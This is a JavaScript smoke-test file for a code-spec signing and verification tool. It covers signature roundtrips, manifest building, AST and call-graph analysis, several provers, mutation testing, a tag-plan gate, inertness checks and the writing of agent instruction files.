'use strict';
// Self-contained smoke test — no disk state, no passphrase prompts.
// Exercises: crypto sign/verify roundtrip, manifest extraction on the example,
// and the color gate (C-040 → GREEN, C-041 → RED via purity violation).

const assert = require('assert');
const path = require('path');
const C = require('../src/crypto');
const { canonical } = require('../src/util');
const { buildManifest } = require('../src/manifest');
const { verifyManifest } = require('../src/verify');

let n = 0;
const ok = (cond, msg) => { n++; assert.ok(cond, msg); console.log('  ✓ ' + msg); };

// 1) ed25519 + keystore roundtrip
const { pubB64, privDer } = C.generateKeypair();
const msg = canonical({ hello: 'world', n: 1 });
const sig = C.sign(msg, privDer);
ok(C.verify(msg, sig, pubB64), 'sign/verify roundtrip succeeds');
ok(!C.verify(msg + 'x', sig, pubB64), 'verify fails on tampered message');
const ks = C.encryptKeystore(privDer, 'pw-123456');
ok(Buffer.compare(C.decryptKeystore(ks, 'pw-123456'), privDer) === 0, 'keystore decrypts with right passphrase');
assert.throws(() => C.decryptKeystore(ks, 'wrong'), 'keystore rejects wrong passphrase');
ok(true, 'keystore rejects wrong passphrase');

// 2) manifest extraction on the example
const exDir = path.join(__dirname, '..', 'examples');
const manifest = buildManifest(exDir);
ok(manifest.cells['C-040'] && manifest.cells['C-041'], 'extracts C-040 and C-041 from examples');
ok(manifest.cells['C-040'].specHash && manifest.cells['C-040'].specHash.length === 64, 'computes a sha256 spec hash');

// 3) unsigned → UNSIGNED
let v = verifyManifest(manifest, { approvals: [] }, { signers: {} });
ok(v.results['C-040'].state === 'UNSIGNED', 'unsigned Cell is UNSIGNED');
ok(!v.passed, 'gate is blocked when Cells are unsigned');

// 4) sign both cells, then GREEN + RED
const approval = {
  id: 'A-0001', project: 'test', prev: 'genesis', nonce: 'n', at: 't', signer: 'tester',
  items: { 'C-040': manifest.cells['C-040'].specHash, 'C-041': manifest.cells['C-041'].specHash },
};
approval.signature = C.sign(canonical(approval), privDer);
const config = { signers: { tester: pubB64 } };
v = verifyManifest(manifest, { approvals: [approval] }, config);
ok(v.results['C-040'].state === 'GREEN', 'signed clean pure Cell → GREEN');
ok(v.results['C-041'].state === 'RED', 'signed impure-but-declared-pure Cell → RED (purity violation)');

// 5) a forged/altered approval must not verify
const forged = { ...approval, items: { ...approval.items }, signer: 'tester' };
forged.items['C-041'] = 'deadbeef'.repeat(8);
const { signature, ...rest } = forged;
ok(!C.verify(canonical(rest), approval.signature, pubB64), 'tampered approval fails signature check');

// 6) AST analyzer finds nested units, not just top-level functions
const { analyze } = require('../src/analyze');
const a = analyze('(function(){ function inner(){} const o = { m(){}, ar: () => 1 }; class K { go(){} } })();');
ok(a.ok, 'analyzer parses an IIFE/object/class snippet');
const names = a.units.map((u) => u.name);
ok(names.includes('inner'), 'analyzer finds a function nested in an IIFE');
ok(names.includes('m'), 'analyzer finds an object method');
ok(names.includes('ar'), 'analyzer finds an arrow-property');
ok(names.some((x) => x.endsWith('.go')), 'analyzer finds a class method');

// 7) TypeScript + JSX are parsed too (via @babel/parser)
const ts = analyze('export class Svc { getV(): number { return 1; } } function u(x: string): string { return x; }');
ok(ts.ok, 'analyzer parses TypeScript');
ok(ts.units.some((u) => u.name.endsWith('.getV')) && ts.units.some((u) => u.name === 'u'), 'TS: finds class method + function');
const jsx = analyze('export default function App(){ return <div className="x"/>; } const h = () => 1;');
ok(jsx.ok, 'analyzer parses JSX');
ok(jsx.units.some((u) => u.name === 'App') && jsx.units.some((u) => u.name === 'h'), 'JSX: finds component + arrow');

// 8) unit-level call graph: calls are attributed to the enclosing unit
const cg = analyze('function a(){ return b() + 1; } function b(){ return 2; } function lonely(){ return 0; }');
ok(cg.units.find((u) => u.name === 'a').callsOut.includes('b'), 'call graph: a() records calling b()');
ok(!cg.units.find((u) => u.name === 'b').callsOut.includes('b'), "call graph: b() doesn't record calling itself");

// 9) blast radius + bloat from the manifest influence pass
const { computeInfluence } = require('../src/manifest');
if (computeInfluence) {
  const cells = {
    'C-1': { unitName: 'a', module: 'm', group: 'Public API', callsOut: ['b'], contains: [] },
    'C-2': { unitName: 'b', module: 'm', group: 'Internal', callsOut: ['c'], contains: [] },
    'C-3': { unitName: 'c', module: 'm', group: 'Internal', callsOut: [], contains: [] },
    'C-4': { unitName: 'orphan', module: 'm', group: 'Internal', callsOut: [], contains: [] },
  };
  computeInfluence(cells);
  ok(cells['C-3'].blast === 2, 'blast: c is depended on transitively by a and b (blast=2)');
  ok(cells['C-3'].directCallers === 1, 'blast: c has 1 direct caller (b)');
  ok(cells['C-4'].bloat === true, 'bloat: orphan with no callers, not public → flagged');
  ok(cells['C-1'].bloat === false, 'bloat: public-API entry with no callers → not flagged');
}

// 10) constitution writer: creates harness files, is idempotent, preserves user text
const os = require('os');
const fs = require('fs');
const { writeConstitution, resolveKeys } = require('../src/constitution');
const tmp = fs.mkdtempSync(require('path').join(os.tmpdir(), 'yay-con-'));
let rep = writeConstitution(tmp, resolveKeys('claude,copilot'));
ok(rep.find((r) => r.key === 'claude').action === 'created', 'constitution: CLAUDE.md created');
const claudeMd = fs.readFileSync(require('path').join(tmp, 'CLAUDE.md'), 'utf8');
ok(/YayLayer Constitution/.test(claudeMd) && /YAYLAYER:BEGIN/.test(claudeMd), 'constitution: CLAUDE.md holds the Constitution + markers');
ok(fs.existsSync(require('path').join(tmp, '.github/copilot-instructions.md')), 'constitution: nested copilot path created');
rep = writeConstitution(tmp, resolveKeys('claude'));
ok(rep[0].action === 'unchanged', 'constitution: re-run is idempotent (unchanged)');
fs.writeFileSync(require('path').join(tmp, 'AGENTS.md'), '# My own notes\nkeep me\n');
writeConstitution(tmp, resolveKeys('agents'));
const agents = fs.readFileSync(require('path').join(tmp, 'AGENTS.md'), 'utf8');
ok(/keep me/.test(agents) && /YAYLAYER:BEGIN/.test(agents), 'constitution: appends to an existing file without destroying user text');
fs.rmSync(tmp, { recursive: true, force: true });
// method-aware: a phone-signed project tells the AI to approve with `yay sign --phone`
const tmpP = fs.mkdtempSync(require('path').join(require('os').tmpdir(), 'con-'));
writeConstitution(tmpP, resolveKeys('claude'), 'phone');
const conP = fs.readFileSync(require('path').join(tmpP, 'CLAUDE.md'), 'utf8');
ok(/`yay sign`/.test(conP) && !/--phone/.test(conP) && /phone/.test(conP) && /returns a completed signature/.test(conP), 'constitution: phone project → plain `yay sign` (auto-phone) + auto-proceed');
ok(/git commit/.test(conP) && /git push` unless/.test(conP), 'constitution: instructs commit-after-verify (durable seal + diff baseline), no auto-push');
writeConstitution(tmpP, resolveKeys('agents'), 'local');
const conL = fs.readFileSync(require('path').join(tmpP, 'AGENTS.md'), 'utf8');
ok(/`yay sign`/.test(conL) && /passphrase/.test(conL), 'constitution: local project → plain `yay sign` (local key)');
fs.rmSync(tmpP, { recursive: true, force: true });

// 10d) spec diff (what the phone shows before approving): LCS line diff + block extract
const SD = require('../src/specdiff');
const dOld = ['intent: add two numbers', 'pure: yes', 'ensures: out == a+b'];
const dNew = ['intent: add two integers', 'pure: yes', 'ensures: out === a+b', 'throws: never'];
const dd = SD.lineDiff(dOld, dNew);
ok(dd && dd.some((x) => x.t === '-') && dd.some((x) => x.t === '+') && dd.some((x) => x.t === ' '), 'specdiff: line diff marks removed / added / unchanged lines');
ok(SD.lineDiff(dOld, dOld) === null, 'specdiff: identical spec → null (nothing to show)');
ok(SD.lineDiff(null, dNew) === null, 'specdiff: no previous version → null (new spec, no diff)');
const dContent = '//∷YAY⟨C-1⟩\n//  intent: foo\n//  pure: yes\n//∷YAY-END⟨C-1⟩\nfunction f(){}';
ok(JSON.stringify(SD.specLinesFromContent(dContent, 'C-1')).includes('intent: foo'), 'specdiff: extracts a cell spec block from raw content');
ok(SD.specLinesFromContent(dContent, 'C-9') === null, 'specdiff: a missing cell id → null');
// end-to-end: specDiffForCell against a REAL git HEAD (guards the cell.specBlock wiring)
try {
  const cp = require('child_process');
  const gdir = fs.mkdtempSync(require('path').join(os.tmpdir(), 'yay-gd-'));
  const gf = require('path').join(gdir, 'x.js');
  fs.writeFileSync(gf, '//∷YAY⟨C-9⟩\n//  unit: f\n//  intent: old intent\n//  pure: yes\n//∷YAY-END⟨C-9⟩\nfunction f(){ return 1; }\n');
  cp.execFileSync('git', ['-C', gdir, 'init', '-q']);
  cp.execFileSync('git', ['-C', gdir, 'add', '-A']);
  cp.execFileSync('git', ['-C', gdir, '-c', 'user.email=x@y.z', '-c', 'user.name=x', 'commit', '-qm', 'base']);
  fs.writeFileSync(gf, '//∷YAY⟨C-9⟩\n//  unit: f\n//  intent: NEW intent\n//  pure: yes\n//∷YAY-END⟨C-9⟩\nfunction f(){ return 1; }\n');
  const gm = buildManifest(gdir);
  const gd = SD.specDiffForCell(gdir, gm.cells['C-9']);
  ok(gd && gd.some((d) => d.t === '-' && /old intent/.test(d.text)) && gd.some((d) => d.t === '+' && /NEW intent/.test(d.text)),
    'specdiff(e2e): specDiffForCell diffs working spec vs committed HEAD (uses cell.specBlock)');
  fs.rmSync(gdir, { recursive: true, force: true });
} catch (e) { ok(false, 'specdiff(e2e): ' + e.message); }

// 10f) parseIn keeps object/array param types intact (bracket-aware split)
const PI = require('../src/prove').parseIn;
ok(JSON.stringify(PI({ in: 'paddle: {x,y,w,h}, step: number, w: number' }).map((p) => p.name)) === '["paddle","step","w"]', 'prove: parseIn keeps object params intact (no comma shredding)');
const EH = require('../src/prove').ensuresHint;
ok(/every/.test(EH('every b.alive == true')) && /implication/.test(EH('a => b')) && /prose/.test(EH('just words here')), 'prove: ensuresHint gives actionable guidance to strengthen prose ensures');
ok(require('../src/prove').normalizeEnsures('|dx| < 3; a >= 0') === 'Math.abs(dx) < 3 &&  a >= 0', 'prove: normalizeEnsures makes |x| and ; evaluable (safe transforms only)');

// 10g) scanner ignores the generated map + honours .yaylayerignore
const igDir = fs.mkdtempSync(require('path').join(os.tmpdir(), 'yay-ig-'));
fs.writeFileSync(require('path').join(igDir, 'yay-layer-map.html'), '<div>//∷YAY⟨C-900⟩ no end marker here</div>');
fs.writeFileSync(require('path').join(igDir, 'a.js'), '//∷YAY⟨C-1⟩\n//  intent: x\n//∷YAY-END⟨C-1⟩\nfunction a(){}\n');
const igMan = buildManifest(igDir);
ok(!igMan.cells['C-900'] && !igMan.problems.some((p) => /map\.html/.test(p.file || '')), 'manifest: generated yay-layer-map.html is not scanned as source');
fs.writeFileSync(require('path').join(igDir, '.yaylayerignore'), 'a.js\n');
ok(!buildManifest(igDir).cells['C-1'], 'manifest: .yaylayerignore excludes listed files');
fs.rmSync(igDir, { recursive: true, force: true });

// 10h) legibility: a signed + machine-checkable ensures counts as PROVEN, prose as unproven
const lgDir = fs.mkdtempSync(require('path').join(os.tmpdir(), 'yay-lg-'));
fs.writeFileSync(require('path').join(lgDir, 'm.js'),
  '//∷YAY⟨C-P⟩\n//  unit: inc\n//  intent: add one\n//  in: a:number\n//  out: number\n//  pure: yes\n//  ensures: out === a + 1\n//∷YAY-END⟨C-P⟩\nfunction inc(a){return a+1;}\n\n' +
  '//∷YAY⟨C-Q⟩\n//  unit: greet\n//  intent: greet by name\n//  in: name:string\n//  out: string\n//  pure: yes\n//  ensures: the greeting is friendly\n//∷YAY-END⟨C-Q⟩\nfunction greet(name){return "hi "+name;}\n');
const lgm = buildManifest(lgDir);
const kpl = C.generateKeypair();
const apl = { id: 'A-1', project: 'x', prev: 'genesis', nonce: 'n', at: '2026-01-01T00:00:00.000Z', signer: 'me', items: { 'C-P': lgm.cells['C-P'].specHash, 'C-Q': lgm.cells['C-Q'].specHash } };
apl.signature = C.sign(canonical(apl), kpl.privDer);
const lgv = verifyManifest(lgm, { approvals: [apl] }, { signers: { me: [{ pub: kpl.pubB64 }] }, owners: ['me'] }, { mutate: false });
ok(lgv.results['C-P'].state === 'GREEN' && lgv.results['C-P'].proven === true, 'verify: a signed + machine-checkable ensures is PROVEN');
ok(lgv.results['C-Q'].state === 'GREEN' && lgv.results['C-Q'].proven === false && lgv.results['C-Q'].hasEnsures, 'verify: a signed prose ensures is GREEN but NOT proven (signed-only)');
ok(lgv.counts.proven >= 1 && lgv.counts.unproven >= 1, 'verify: counts split green into machine-proven vs signed-only');
fs.rmSync(lgDir, { recursive: true, force: true });

// 10e) unit-name mismatch (A) + dangling-reference (B) checks
const abDir = fs.mkdtempSync(require('path').join(os.tmpdir(), 'yay-ab-'));
fs.writeFileSync(require('path').join(abDir, 'a.js'),
  '//∷YAY⟨C-A⟩\n//  unit: doThing\n//  intent: does a thing\n//  pure: yes\n//∷YAY-END⟨C-A⟩\nfunction doThingRenamed(){ return 1; }\n\n' +
  '//∷YAY⟨C-B⟩\n//  unit: caller\n//  intent: calls a helper\n//∷YAY-END⟨C-B⟩\nfunction caller(){ return missingHelper(2) + doThingRenamed(); }\n');
const abMan = buildManifest(abDir);
const abVer = verifyManifest(abMan, { approvals: [] }, {}, { mutate: false });
const noteA = (abVer.results['C-A'].notes || []).map((n) => n.text).join(' | ');
const noteB = (abVer.results['C-B'].notes || []).map((n) => n.text).join(' | ');
ok(/unit name mismatch/.test(noteA) && /doThingRenamed/.test(noteA), 'verify(A): flags unit-name mismatch (spec `unit:` vs the real function)');
ok(/undefined name/.test(noteB) && /missingHelper/.test(noteB) && !/doThingRenamed/.test(noteB), 'verify(B): flags a dangling call (missingHelper) but not a defined one (doThingRenamed)');
fs.rmSync(abDir, { recursive: true, force: true });

// 11) behavioural prover: satisfied ensures → pass, violated → fail, prose → skip
const { proveManifest } = require('../src/prove');
const P = require('path');
const ptmp = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-prove-'));
fs.writeFileSync(P.join(ptmp, 'p.js'), 'function good(id){return `/pfps/${id}.png`;}\nfunction bad(id){return `/x/${id}.png`;}\n');
const mkcell = (id, unit, ens) => ({ id, file: 'p.js', unitName: unit, unitFound: true, contains: [], spec: { pure: 'yes', in: 'id:number', out: 'string', ensures: ens } });
const pm = proveManifest({ root: ptmp, cells: {
  'C-1': mkcell('C-1', 'good', 'out == `/pfps/${id}.png`'),
  'C-2': mkcell('C-2', 'bad', 'out == `/pfps/${id}.png`'),
  'C-3': mkcell('C-3', 'good', 'the url should be nice'),
} });
ok(pm['C-1'].status === 'pass', 'prover: satisfied ensures → pass');
ok(pm['C-2'].status === 'fail' && /bad\(/.test(pm['C-2'].counterexample), 'prover: violated ensures → fail with counterexample');
ok(pm['C-3'].status === 'skip', 'prover: prose ensures → skip (not machine-checkable, not a false pass)');
fs.rmSync(ptmp, { recursive: true, force: true });

// 12) mutation testing: a tight ensures kills mutants; a loose one lets them survive
const mtmp = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-mut-'));
fs.writeFileSync(P.join(mtmp, 'm.js'), 'function url(id){ return `/pfps/${id}.png`; }\n');
const mkc = (unit, ens, body, start) => ({ id: unit, file: 'm.js', unitName: unit, unitFound: true, unitBody: body, unitBodyStart: start, contains: [], spec: { pure: 'yes', in: 'id:number', out: 'string', ensures: ens } });
const bodyLine = 'function url(id){ return `/pfps/${id}.png`; }';
const strong = proveManifest({ root: mtmp, cells: { url: mkc('url', 'out == `/pfps/${id}.png`', bodyLine, 0) } }, { mutate: true }).url;
ok(strong.status === 'pass' && strong.mutation && strong.mutation.total > 0, 'mutation: mutants were generated and run');
ok(strong.mutation.score >= 0.8, 'mutation: a tight ensures kills most mutants (high score)');
const weak = proveManifest({ root: mtmp, cells: { url: mkc('url', 'out.length > 0', bodyLine, 0) } }, { mutate: true }).url;
ok(weak.mutation.survived > 0 && weak.mutation.score < 0.5, 'mutation: a loose ensures (out.length>0) lets mutants survive (low score)');
fs.rmSync(mtmp, { recursive: true, force: true });

// 12b) React/JSX component prover: render the component, check ensures against the tree
const rtmp = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-render-'));
fs.writeFileSync(P.join(rtmp, 'ui.jsx'),
  'export function Card({ title, slug, featured }) {\n'
  + "  return <a href={'/game/' + slug} className={featured ? 'card featured' : 'card'}>{title}</a>;\n"
  + '}\n'
  + 'export function BadCard({ title, slug }) {\n'
  + "  return <a href={'/wrong/' + slug}>{title}</a>;\n"
  + '}\n'
  + 'export function Label({ label }) { return <><span>{label}</span></>; }\n');
const rcell = (id, unit, ens, inTy) => ({ id, file: 'ui.jsx', unitName: unit, unitFound: true, contains: [], spec: { renders: 'yes', in: inTy, out: 'jsx', ensures: ens } });
const rm = proveManifest({ root: rtmp, cells: {
  'C-R1': rcell('C-R1', 'Card', "text(out).includes(props.title) && attr(find(out,'a'),'href')==='/game/'+props.slug && (props.featured?hasClass(out,'featured'):true)", 'props: {title:string, slug:string, featured:boolean}'),
  'C-R2': rcell('C-R2', 'BadCard', "attr(find(out,'a'),'href')==='/game/'+props.slug", 'props: {title:string, slug:string}'),
  'C-R3': rcell('C-R3', 'Label', "find(out,'span')!==null && text(out)===props.label", 'props: {label:string}'),
} }, { mutate: false });
ok(rm['C-R1'].status === 'pass', 'render prover: correct component → proven (render matches ensures)');
ok(rm['C-R2'].status === 'fail' && /BadCard\(/.test(rm['C-R2'].counterexample || ''), 'render prover: wrong href → red with a counterexample');
ok(rm['C-R3'].status === 'pass', 'render prover: fragment + text()/find() contract holds');
// object-shape prop generation preserves camelCase field names
ok((require('../src/prove').valuesFor('{onClick:boolean, myId:string}') || []).some((o) => 'onClick' in o && 'myId' in o), 'render prover: object props generate with case-preserved field names');
fs.rmSync(rtmp, { recursive: true, force: true });

// 12c) proving-adapter registry: a custom adapter can be registered and dispatched to
const { runSource: RS, parseIn: PIx, buildChecker: BC } = require('../src/prove');
const atmp = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-adapter-'));
fs.writeFileSync(P.join(atmp, 'a.js'), 'function twice(n){return n*2;}\n');
const customAdapter = {
  name: 'x2', inVM: true, wantsJSX: false,
  canHandle: (cell) => (cell.spec && cell.spec.kind) === 'x2',
  load: (s, names, o) => RS(s, names, { file: o.file }),
  inputs: (cell) => PIx(cell.spec),
  inputNoun: 'inputs', threwVerb: 'on generated inputs',
  checker: (ctx, params, ens) => BC(ctx, params, ens),
  describe: (cell, a, r, e) => `${cell.unitName}(${a}) → ${r.out}`,
};
const acell = { id: 'C-A', file: 'a.js', unitName: 'twice', unitFound: true, contains: [], spec: { kind: 'x2', in: 'n:number', out: 'number', ensures: 'out === n*2' } };
const ar = proveManifest({ root: atmp, cells: { 'C-A': acell } }, { adapters: [customAdapter], mutate: false });
ok(ar['C-A'] && ar['C-A'].status === 'pass', 'adapter registry: a custom adapter is dispatched and proves its Cell');
const ar2 = proveManifest({ root: atmp, cells: { 'C-A': acell } }, { mutate: false });
ok(!ar2['C-A'], 'adapter registry: the default registry ignores a Cell none of its adapters handle');
fs.rmSync(atmp, { recursive: true, force: true });

// 12d) Python out-of-VM adapter — proves Python Cells via a subprocess. Robust whether
// or not Python is installed: present → prove/fail verdicts; absent → honest skip.
const pyProbe = require('../src/prove').pythonAdapter.load('x=1', ['x']);
const pdir = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-py-'));
fs.writeFileSync(P.join(pdir, 'm.py'), 'def twice(n):\n    return n * 2\n\ndef bad(n):\n    return n + 2\n');
const pcell = (id, unit, ens) => ({ id, file: 'm.py', lang: 'python', unitName: unit, unitFound: true, contains: [], spec: { lang: 'python', pure: 'yes', in: 'n:number', out: 'number', ensures: ens } });
const pr = proveManifest({ root: pdir, cells: { 'C-1': pcell('C-1', 'twice', 'out == n * 2'), 'C-2': pcell('C-2', 'bad', 'out == n * 2') } }, { mutate: false });
if (pyProbe.error) {
  ok(pr['C-1'].status === 'skip' && /python/i.test(pr['C-1'].reason || ''), 'python adapter: absent Python → honest skip (no fake pass)');
  ok(pr['C-2'].status === 'skip', 'python adapter: absent Python → the buggy Cell also skips, never green');
} else {
  ok(pr['C-1'].status === 'pass', 'python adapter: correct Python function → proven (out-of-VM subprocess)');
  ok(pr['C-2'].status === 'fail' && /bad\(/.test(pr['C-2'].counterexample || ''), 'python adapter: wrong Python code → red with a counterexample');
}
fs.rmSync(pdir, { recursive: true, force: true });

// 12e) tag-plan gate: signing is refused while the plan is unfinished; adopted (DERIVED)
// Cells can't be signed before any plan exists at all.
{
  const T = require('../src/tags');
  ok(!T.planStatus({ tags: ['Custom 1', 'Custom 2', 'Custom 3', 'Custom 4'] }).ok, 'tag plan: custom placeholders → unfinished');
  ok(!T.planStatus({ tags: ['UI', 'API', 'Auth'] }).ok, 'tag plan: fewer than 5 unique tags → unfinished');
  ok(!T.planStatus({ tags: ['UI', 'API', 'Auth', 'Data', 'Custom 3'] }).ok, 'tag plan: one leftover placeholder → still unfinished');
  ok(T.planStatus({ tags: ['UI', 'API', 'Auth', 'Data', 'Perf'] }).ok, 'tag plan: 5 unique real tags → finished');
  ok(!T.planStatus(null).exists, 'tag plan: no pool → exists=false (non-adopted signing may proceed untagged)');

  // CLI: sign refuses with a placeholder pool / an undersized pool / DERIVED cells + no pool.
  const cpx = require('child_process');
  const sgd = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-taggate-'));
  const yay = P.join(__dirname, '..', 'bin', 'yay.js');
  const run = (args) => cpx.spawnSync(process.execPath, [yay, ...args], { cwd: sgd, encoding: 'utf8', timeout: 30000, env: { ...process.env, YAY_PASSPHRASE: 'pw-123456' }, stdio: ['ignore', 'pipe', 'pipe'] });
  run(['init', '--key', 'local', '--name', 'T', '--no-adopt', '--no-plan', '--tags', 'none']); // non-interactive setup, no pool
  fs.writeFileSync(P.join(sgd, 'a.js'), '//∷YAY⟨C-1⟩\n// unit: one\n// in: n:number\n// out: number\n// pure: yes\n// ensures: out === 1\n//∷YAY-END⟨C-1⟩\nfunction one(n){return 1;}\n');
  fs.writeFileSync(P.join(sgd, '.yaylayer', 'tags.json'), JSON.stringify({ project: 'x', set: 'custom', tags: ['Custom 1', 'Custom 2', 'Custom 3', 'Custom 4'] }));
  let sr = run(['sign', '--brief', 'b', '--no-title', '--local', '--no-tags']);
  ok(sr.status !== 0 && /placeholder/i.test(sr.stderr + sr.stdout), 'sign gate: placeholder pool → refused (relabel first)');
  fs.writeFileSync(P.join(sgd, '.yaylayer', 'tags.json'), JSON.stringify({ project: 'x', set: 'custom', tags: ['UI', 'API', 'Auth'] }));
  sr = run(['sign', '--brief', 'b', '--no-title', '--local', '--no-tags']);
  ok(sr.status !== 0 && /at least 5 unique/i.test(sr.stderr + sr.stdout), 'sign gate: pool under 5 unique tags → refused');
  fs.rmSync(P.join(sgd, '.yaylayer', 'tags.json'));
  fs.writeFileSync(P.join(sgd, 'b.js'), '//∷YAY⟨C-2⟩ v0  DERIVED — unconfirmed, not human-reviewed\n// unit: two\n// in: n:number\n// out: number\n// pure: yes\n//∷YAY-END⟨C-2⟩\nfunction two(n){return 2;}\n');
  sr = run(['sign', '--brief', 'b', '--no-title', '--local', '--no-tags']);
  ok(sr.status !== 0 && /tag plan exists/i.test(sr.stderr + sr.stdout), 'sign gate: DERIVED cells + no plan → refused');
  fs.rmSync(sgd, { recursive: true, force: true });
}

// 12f) Python in the FULL verify pipeline: a proven pure Python Cell reaches GREEN
// (the old blanket non-JS Yellow cap must not override a real proof); an unproven
// non-JS Cell stays capped; and Python purity claims are policed by Python signals.
{
  const pv = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-pyverify-'));
  fs.writeFileSync(P.join(pv, 'calc.py'),
    '#∷YAY⟨C-P1⟩\n# unit: triple\n# intent: Triple a number.\n# in: n:number\n# out: number\n# pure: yes\n# ensures: out == n * 3\n#∷YAY-END⟨C-P1⟩\ndef triple(n):\n    return n * 3\n\n'
    + '#∷YAY⟨C-P2⟩\n# unit: shout\n# intent: Print loudly.\n# in: s:string\n# out: string\n# pure: yes\n# ensures: out == s\n#∷YAY-END⟨C-P2⟩\ndef shout(s):\n    print(s)\n    return s\n');
  const pvMan = buildManifest(pv);
  // sign both so trust isn't the blocker
  const pvKp = C.generateKeypair();
  const pvItems = {}; for (const id of ['C-P1', 'C-P2']) pvItems[id] = pvMan.cells[id].specHash;
  const pvAp = { id: 'A-1', project: 'pv', prev: 'genesis', nonce: 'n', at: new Date().toISOString(), signer: 'T', items: pvItems };
  pvAp.signature = C.sign(canonical(pvAp), pvKp.privDer);
  const pvRes = verifyManifest(pvMan, { approvals: [pvAp] }, { signers: { T: pvKp.pubB64 } });
  const pyOK = !require('../src/prove').pythonAdapter.load('x=1', ['x']).error;
  if (pyOK) ok(pvRes.results['C-P1'].state === 'GREEN' && pvRes.results['C-P1'].proven, 'verify: proven pure Python Cell reaches GREEN (cap lifted by real proof)');
  else ok(pvRes.results['C-P1'].state === 'YELLOW', 'verify: Python without a Python runtime stays honestly Yellow');
  ok(pvRes.results['C-P2'].state === 'RED' && pvRes.results['C-P2'].notes.some((n) => /purity violated/.test(n.text)), 'verify: pure:yes Python Cell using print() → RED (Python effect signals)');
  fs.rmSync(pv, { recursive: true, force: true });
  // non-JS, non-provable language still capped
  const rs = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-rs-'));
  fs.writeFileSync(P.join(rs, 'lib.rs'), '//∷YAY⟨C-R1⟩\n// unit: add\n// intent: Add.\n// in: a:number\n// out: number\n// pure: yes\n// ensures: out == a + 1\n//∷YAY-END⟨C-R1⟩\nfn add(a: i32) -> i32 { a + 1 }\n');
  const rsMan = buildManifest(rs);
  const rsAp = { id: 'A-1', project: 'rs', prev: 'genesis', nonce: 'n', at: new Date().toISOString(), signer: 'T', items: { 'C-R1': rsMan.cells['C-R1'].specHash } };
  rsAp.signature = C.sign(canonical(rsAp), pvKp.privDer);
  const rsRes = verifyManifest(rsMan, { approvals: [rsAp] }, { signers: { T: pvKp.pubB64 } });
  ok(rsRes.results['C-R1'].state === 'YELLOW' && rsRes.results['C-R1'].notes.some((n) => /signed, but not machine-verified/.test(n.text)), 'verify: unproven non-JS (Rust) Cell still capped at Yellow');
  fs.rmSync(rs, { recursive: true, force: true });
  // adopt purity guess is per-language: Python print() → pure: no
  const ad = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-adpy-'));
  fs.writeFileSync(P.join(ad, 'm.py'), 'def hello(name):\n    print(name)\n    return name\n');
  require('../src/adopt').adopt(ad, { dry: false });
  ok(/# {2}pure: {4}no|pure:\s+no/.test(fs.readFileSync(P.join(ad, 'm.py'), 'utf8')), 'adopt: Python body with print() is guessed pure: no (per-language effect guess)');
  fs.rmSync(ad, { recursive: true, force: true });
}

// 12g) INERTNESS check: a dormant branch (pure, ensures-consistent, never hit by
// generated inputs) is flagged; declared guards (throws:) and perf: are exempt;
// policy escalates to block or relaxes to note.
{
  const itmp = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-inert-'));
  const ispec = (id, unit, extra) => `//∷YAY⟨${id}⟩\n// unit: ${unit}\n// intent: t.\n// in: n:number\n// out: number\n// pure: yes\n// ensures: out === n * 2\n${extra || ''}//∷YAY-END⟨${id}⟩\n`;
  fs.writeFileSync(P.join(itmp, 'a.js'),
    ispec('C-1', 'clean') + 'function clean(n){ return n * 2; }\n\n'
    + ispec('C-2', 'dormant') + 'function dormant(n){ if (n === 987654) { return n * 2; } return n * 2; }\n\n' // inert but contract-CONSISTENT (returns the right value) → seeding can't convict, inertness flags it
    + ispec('C-3', 'guarded', '// throws: TypeError when n is not a number\n') + 'function guarded(n){ if (typeof n !== "number") { throw new TypeError("n"); } return n * 2; }\n\n'
    + ispec('C-4', 'cached', '// perf: memoized fast-path for zero\n') + 'function cached(n){ if (n === 0) { return 0; } return n * 2; }\n');
  const iman = buildManifest(itmp);
  const ikp = C.generateKeypair();
  const iit = {}; for (const id of ['C-1', 'C-2', 'C-3', 'C-4']) iit[id] = iman.cells[id].specHash;
  const iap = { id: 'A-1', project: 'x', prev: 'genesis', nonce: 'n', at: new Date().toISOString(), signer: 'T', items: iit };
  iap.signature = C.sign(canonical(iap), ikp.privDer);
  const icfg = { signers: { T: ikp.pubB64 } };
  const ires = verifyManifest(iman, { approvals: [iap] }, icfg);
  ok(ires.results['C-1'].state === 'GREEN' && !ires.results['C-1'].notes.some((n) => /inert code/.test(n.text)), 'inertness: clean Cell → green, no flag');
  ok(ires.results['C-2'].state === 'YELLOW' && ires.results['C-2'].notes.some((n) => n.level === 'yellow' && /inert code/.test(n.text)), 'inertness: dormant branch → Yellow cap (default) with the prune/spec/declare route');
  ok(ires.results['C-3'].state === 'GREEN', 'inertness: guard matching a declared throws: → exempt (still green)');
  ok(ires.results['C-4'].state === 'GREEN' && ires.results['C-4'].notes.some((n) => /inertness: Cell exempt — perf:/.test(n.text)), 'inertness: perf: declaration → exempt, reason shown (signed)');
  const iresB = verifyManifest(iman, { approvals: [iap] }, icfg, { policy: { rules: [{ match: { path: 'a.js' }, inert: 'block' }] } });
  ok(iresB.results['C-2'].state === 'RED' && iresB.results['C-2'].notes.some((n) => n.level === 'red' && /inert/.test(n.text)), 'inertness: policy inert:block → RED (gate-blocking)');
  const iresN = verifyManifest(iman, { approvals: [iap] }, icfg, { policy: { rules: [{ match: { path: 'a.js' }, inert: 'note' }] } });
  ok(iresN.results['C-2'].notes.some((n) => n.level === 'info' && /inert/.test(n.text)) && !iresN.results['C-2'].notes.some((n) => n.level === 'yellow' && /inert/.test(n.text)), 'inertness: policy inert:note → the inert finding becomes info-level (no Yellow cap from it)');
  fs.rmSync(itmp, { recursive: true, force: true });
  // policy helper directly
  const PM = require('../src/policy');
  ok(PM.inertLevel({ rules: [] }, { file: 'x.js', spec: {} }) === 'yellow', 'inertness: no rule → yellow default');
  ok(PM.inertLevel({ rules: [{ match: { tag: 'sensitive' }, inert: 'block' }] }, { file: 'x.js', spec: { sensitive: 'yes' } }) === 'block', 'inertness: sensitive-tag rule escalates to block');
}

// 12h) language-parity audit fixes: rename detection, bloat, and honest proven-notes
// for non-JS Cells (the JS-only assumptions that predated the Python/JSX provers).
{
